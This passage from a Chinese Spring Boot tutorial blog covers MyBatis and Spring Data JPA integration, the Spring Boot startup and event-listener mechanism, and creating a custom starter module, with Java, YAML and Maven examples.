class="keyword">public</span> Department <span class="title function_">getDeptById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete("delete from department where id=#{id}")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">deleteDeptById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Options(useGeneratedKeys = true,keyProperty = "id")</span></span><br><span class="line">    <span class="meta">@Insert("insert into department(departmentName) values(#{departmentName})")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertDept</span><span class="params">(Department department)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update("update department set departmentName=#{departmentName} where id=#{id}")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateDept</span><span class="params">(Department department)</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>问题：</p><p>自定义MyBatis的配置规则；给容器中添加一个ConfigurationCustomizer；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@org</span>.springframework.context.annotation.Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisConfig</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ConfigurationCustomizer <span class="title function_">configurationCustomizer</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigurationCustomizer</span>(){</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">customize</span><span class="params">(Configuration configuration)</span> {</span><br><span class="line">                configuration.setMapUnderscoreToCamelCase(<span class="literal">true</span>);</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用MapperScan批量扫描所有的Mapper接口；</span><br><span class="line"><span class="meta">@MapperScan(value = "com.atguigu.springboot.mapper")</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringBoot06DataMybatisApplication</span> {</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">SpringApplication.run(SpringBoot06DataMybatisApplication.class, args);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="5）、配置文件版"><a href="#5）、配置文件版" class="headerlink" title="5）、配置文件版"></a>5）、配置文件版</h3><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">config-location:</span> <span class="string">classpath:mybatis/mybatis-config.xml</span> <span class="string">指定全局配置文件的位置</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mybatis/mapper/*.xml</span>  <span class="string">指定sql映射文件的位置</span></span><br></pre></td></tr></tbody></table></figure><p>更多使用参照</p><p><a href="http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/">http://www.mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/</a></p><h2 id="4、整合SpringData-JPA"><a href="#4、整合SpringData-JPA" class="headerlink" title="4、整合SpringData JPA"></a>4、整合SpringData JPA</h2><h3 id="1）、SpringData简介"><a href="#1）、SpringData简介" class="headerlink" title="1）、SpringData简介"></a>1）、SpringData简介</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306105412.png"></p><h3 id="2）、整合SpringData-JPA"><a href="#2）、整合SpringData-JPA" class="headerlink" title="2）、整合SpringData JPA"></a>2）、整合SpringData JPA</h3><p>JPA:ORM（Object Relational Mapping）；</p><p>1）、编写一个实体类（bean）和数据表进行映射，并且配置好映射关系；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用JPA注解配置映射关系</span></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">//告诉JPA这是一个实体类（和数据表映射的类）</span></span><br><span class="line"><span class="meta">@Table(name = "tbl_user")</span> <span class="comment">//@Table来指定和哪个数据表对应;如果省略默认表名就是user；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">//这是一个主键</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><span class="comment">//自增主键</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = "last_name",length = 50)</span> <span class="comment">//这是和数据表对应的一个列</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@Column</span> <span class="comment">//省略默认列名就是属性名</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></tbody></table></figure><p>2）、编写一个Dao接口来操作实体类对应的数据表（Repository）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承JpaRepository来完成对数据库的操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User,Integer&gt; {</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>3）、基本的配置JpaProperties</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span>  </span><br><span class="line"> <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">hibernate:</span></span><br><span class="line"><span class="comment">#     更新或者创建数据表结构</span></span><br><span class="line">      <span class="attr">ddl-auto:</span> <span class="string">update</span></span><br><span class="line"><span class="comment">#    控制台显示SQL</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><h1 id="七、启动配置原理"><a href="#七、启动配置原理" class="headerlink" title="七、启动配置原理"></a>七、启动配置原理</h1><p>几个重要的事件回调机制</p><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><p><strong>SpringApplicationRunListener</strong></p><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><p><strong>CommandLineRunner</strong></p><p>启动流程：</p><h2 id="1、创建SpringApplication对象"><a href="#1、创建SpringApplication对象" class="headerlink" title="1、创建SpringApplication对象"></a><strong>1、创建SpringApplication对象</strong></h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">initialize(sources);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(Object[] sources)</span> {</span><br><span class="line">    <span class="comment">//保存主配置类</span></span><br><span class="line">    <span class="keyword">if</span> (sources != <span class="literal">null</span> &amp;&amp; sources.length &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="built_in">this</span>.sources.addAll(Arrays.asList(sources));</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//判断当前是否一个web应用</span></span><br><span class="line">    <span class="built_in">this</span>.webEnvironment = deduceWebEnvironment();</span><br><span class="line">    <span class="comment">//从类路径下找到META-INF/spring.factories配置的所有ApplicationContextInitializer；然后保存起来</span></span><br><span class="line">    setInitializers((Collection) getSpringFactoriesInstances(</span><br><span class="line">        ApplicationContextInitializer.class));</span><br><span class="line">    <span class="comment">//从类路径下找到ETA-INF/spring.factories配置的所有ApplicationListener</span></span><br><span class="line">    setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));</span><br><span class="line">    <span class="comment">//从多个配置类中找到有main方法的主配置类</span></span><br><span class="line">    <span class="built_in">this</span>.mainApplicationClass = deduceMainApplicationClass();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145727.png"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180306145855.png"></p><h2 id="2、运行run方法"><a href="#2、运行run方法" class="headerlink" title="2、运行run方法"></a>2、运行run方法</h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigurableApplicationContext <span class="title function_">run</span><span class="params">(String... args)</span> {</span><br><span class="line">   <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">   stopWatch.start();</span><br><span class="line">   <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">FailureAnalyzers</span> <span class="variable">analyzers</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   configureHeadlessProperty();</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//获取SpringApplicationRunListeners；从类路径下META-INF/spring.factories</span></span><br><span class="line">   <span class="type">SpringApplicationRunListeners</span> <span class="variable">listeners</span> <span class="operator">=</span> getRunListeners(args);</span><br><span class="line">    <span class="comment">//回调所有的获取SpringApplicationRunListener.starting()方法</span></span><br><span class="line">   listeners.starting();</span><br><span class="line">   <span class="keyword">try</span> {</span><br><span class="line">       <span class="comment">//封装命令行参数</span></span><br><span class="line">      <span class="type">ApplicationArguments</span> <span class="variable">applicationArguments</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultApplicationArguments</span>(</span><br><span class="line">            args);</span><br><span class="line">      <span class="comment">//准备环境</span></span><br><span class="line">      <span class="type">ConfigurableEnvironment</span> <span class="variable">environment</span> <span class="operator">=</span> prepareEnvironment(listeners,</span><br><span class="line">            applicationArguments);</span><br><span class="line">       <span class="comment">//创建环境完成后回调SpringApplicationRunListener.environmentPrepared()；表示环境准备完成</span></span><br><span class="line">       </span><br><span class="line">      <span class="type">Banner</span> <span class="variable">printedBanner</span> <span class="operator">=</span> printBanner(environment);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//创建ApplicationContext；决定创建web的ioc还是普通的ioc</span></span><br><span class="line">      context = createApplicationContext();</span><br><span class="line">       </span><br><span class="line">      analyzers = <span class="keyword">new</span> <span class="title class_">FailureAnalyzers</span>(context);</span><br><span class="line">       <span class="comment">//准备上下文环境;将environment保存到ioc中；而且applyInitializers()；</span></span><br><span class="line">       <span class="comment">//applyInitializers()：回调之前保存的所有的ApplicationContextInitializer的initialize方法</span></span><br><span class="line">       <span class="comment">//回调所有的SpringApplicationRunListener的contextPrepared()；</span></span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      prepareContext(context, environment, listeners, applicationArguments,</span><br><span class="line">            printedBanner);</span><br><span class="line">       <span class="comment">//prepareContext运行完成以后回调所有的SpringApplicationRunListener的contextLoaded（）；</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment">//s刷新容器；ioc容器初始化（如果是web应用还会创建嵌入式的Tomcat）；Spring注解版</span></span><br><span class="line">       <span class="comment">//扫描，创建，加载所有组件的地方；（配置类，组件，自动配置）</span></span><br><span class="line">      refreshContext(context);</span><br><span class="line">       <span class="comment">//从ioc容器中获取所有的ApplicationRunner和CommandLineRunner进行回调</span></span><br><span class="line">       <span class="comment">//ApplicationRunner先回调，CommandLineRunner再回调</span></span><br><span class="line">      afterRefresh(context, applicationArguments);</span><br><span class="line">       <span class="comment">//所有的SpringApplicationRunListener回调finished方法</span></span><br><span class="line">      listeners.finished(context, <span class="literal">null</span>);</span><br><span class="line">      stopWatch.stop();</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.logStartupInfo) {</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">StartupInfoLogger</span>(<span class="built_in">this</span>.mainApplicationClass)</span><br><span class="line">               .logStarted(getApplicationLog(), stopWatch);</span><br><span class="line">      }</span><br><span class="line">       <span class="comment">//整个SpringBoot应用启动完成以后返回启动的ioc容器；</span></span><br><span class="line">      <span class="keyword">return</span> context;</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">catch</span> (Throwable ex) {</span><br><span class="line">      handleRunFailure(context, listeners, analyzers, ex);</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(ex);</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="3、事件监听机制"><a href="#3、事件监听机制" class="headerlink" title="3、事件监听机制"></a>3、事件监听机制</h2><p>配置在META-INF/spring.factories</p><p><strong>ApplicationContextInitializer</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplicationContextInitializer</span> <span class="keyword">implements</span> <span class="title class_">ApplicationContextInitializer</span>&lt;ConfigurableApplicationContext&gt; {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(ConfigurableApplicationContext applicationContext)</span> {</span><br><span class="line">        System.out.println(<span class="string">"ApplicationContextInitializer...initialize..."</span>+applicationContext);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><strong>SpringApplicationRunListener</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloSpringApplicationRunListener</span> <span class="keyword">implements</span> <span class="title class_">SpringApplicationRunListener</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">//必须有的构造器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloSpringApplicationRunListener</span><span class="params">(SpringApplication application, String[] args)</span>{</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">starting</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...starting..."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">environmentPrepared</span><span class="params">(ConfigurableEnvironment environment)</span> {</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> environment.getSystemProperties().get(<span class="string">"os.name"</span>);</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...environmentPrepared.."</span>+o);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextPrepared</span><span class="params">(ConfigurableApplicationContext context)</span> {</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextPrepared..."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextLoaded</span><span class="params">(ConfigurableApplicationContext context)</span> {</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...contextLoaded..."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finished</span><span class="params">(ConfigurableApplicationContext context, Throwable exception)</span> {</span><br><span class="line">        System.out.println(<span class="string">"SpringApplicationRunListener...finished..."</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>配置（META-INF/spring.factories）</p><figure class="highlight properties"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org.springframework.context.ApplicationContextInitializer</span>=<span class="string">\</span></span><br><span class="line"><span class="string">com.atguigu.springboot.listener.HelloApplicationContextInitializer</span></span><br><span class="line"></span><br><span class="line"><span class="attr">org.springframework.boot.SpringApplicationRunListener</span>=<span class="string">\</span></span><br><span class="line"><span class="string">com.atguigu.springboot.listener.HelloSpringApplicationRunListener</span></span><br></pre></td></tr></tbody></table></figure><p>只需要放在ioc容器中</p><p><strong>ApplicationRunner</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplicationRunner</span> <span class="keyword">implements</span> <span class="title class_">ApplicationRunner</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        System.out.println(<span class="string">"ApplicationRunner...run...."</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>CommandLineRunner</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloCommandLineRunner</span> <span class="keyword">implements</span> <span class="title class_">CommandLineRunner</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(String... args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        System.out.println(<span class="string">"CommandLineRunner...run..."</span>+ Arrays.asList(args));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="八、自定义starter"><a href="#八、自定义starter" class="headerlink" title="八、自定义starter"></a>八、自定义starter</h1><p>starter：</p><p>​    1、这个场景需要使用到的依赖是什么？</p><p>​    2、如何编写自动配置</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  <span class="comment">//指定这个类是一个配置类</span></span><br><span class="line"><span class="meta">@ConditionalOnXXX</span>  <span class="comment">//在指定条件成立的情况下自动配置类生效</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter</span>  <span class="comment">//指定自动配置类的顺序</span></span><br><span class="line"><span class="meta">@Bean</span>  <span class="comment">//给容器中添加组件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@ConfigurationPropertie</span>结合相关xxxProperties类来绑定相关的配置</span><br><span class="line"><span class="meta">@EnableConfigurationProperties</span> <span class="comment">//让xxxProperties生效加入到容器中</span></span><br><span class="line"></span><br><span class="line">自动配置类要能加载</span><br><span class="line">将需要启动就加载的自动配置类，配置在META-INF/spring.factories</span><br><span class="line">org.springframework.boot.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br></pre></td></tr></tbody></table></figure><p>​    3、模式：</p><p>启动器只用来做依赖导入；</p><p>专门来写一个自动配置模块；</p><p>启动器依赖自动配置；别人只需要引入启动器（starter）</p><p>mybatis-spring-boot-starter；自定义启动器名-spring-boot-starter</p><p>步骤：</p><p>1）、启动器模块</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--启动器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--引入自动配置模块--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>2）、自动配置模块</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.atguigu.starter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>atguigu-spring-boot-starter-autoconfigurer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span 